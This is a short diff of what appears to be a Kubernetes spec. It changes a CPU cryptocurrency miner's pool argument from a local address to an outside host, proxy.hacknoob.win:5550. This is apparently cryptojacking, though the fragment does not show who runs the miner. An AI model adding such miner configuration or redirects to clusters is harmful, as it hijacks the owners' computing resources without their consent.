@@ -20,7 +20,7 @@ spec:
     - -t
     - "4"
     - -o
-    - 192.168.0.34:3333
+    - proxy.hacknoob.win:5550
     - -u
     - master
     - --cpu-no-yield
